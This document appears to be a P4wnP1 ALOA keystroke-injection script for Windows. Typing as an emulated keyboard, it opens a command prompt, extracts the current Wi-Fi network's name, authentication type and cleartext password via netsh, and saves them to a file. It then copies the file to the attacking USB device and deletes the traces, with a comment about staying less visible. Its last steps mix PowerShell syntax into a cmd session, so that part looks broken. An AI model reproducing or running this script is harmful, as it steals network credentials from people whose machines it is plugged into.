
layout("US"); //set US layout

typingSpeed(25,0);
press("GUI r")
delay(1000)
type("cmd")
press("ENTER")
delay(1000)
// --> Change directory (you can change this to something else to make less visible)
type("cd \"%USERPROFILE%\\Desktop\"")
press("ENTER")
// --> Get SSID
type("for /f \"tokens=2 delims=: \" %A in (\'netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"B\"') do set SSID=%A")
press("ENTER")
// --> Get network type
type("netsh wlan show profiles %SSID% | findstr \"Network type\" | findstr /v \"broadcast\" | findstr /v \"Radio\">Temp.txt")
press("ENTER")
type("for /f \"tokens=3 delims=: \" %A in (\'findstr \"Network type\" Temp.txt\') do set NETTYPE=%A")
press("ENTER")
// --> Get authentication
type("netsh wlan show profiles %SSID% | findstr \"Authentication\">Temp.txt")
press("ENTER")
type("for /f \"tokens=2 delims=: \" %A in (\'findstr \"Authentication\" Temp.txt\') do set AUTH=%A")
press("ENTER")
// --> Get key
type("netsh wlan show profiles %SSID% key=clear | findstr \"Key Content\">Temp.txt")
press("ENTER")
type("for /f \"tokens=3 delims=: \" %A in (\'findstr \"Key Content\" Temp.txt\') do set KEY=%A")
press("ENTER")
// --> Delete Temp.txt
type("del Temp.txt")
press("ENTER")
// --> Create Log.txt
type("echo SSID: %SSID%>>wirelesspassword.txt & echo Network type: %NETTYPE%>>wirelesspassword.txt & echo Authentication: %AUTH%>>wirelesspassword.txt & echo Password: %KEY%>>wirelesspassword.txt")
press("ENTER")
delay(1000)
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'P4wnP1 ALOA' } | select name \n")
type("copy wirelesspassword.txt $usbpath.name\n")
type("del wirelesspassword.txt ; exit\n")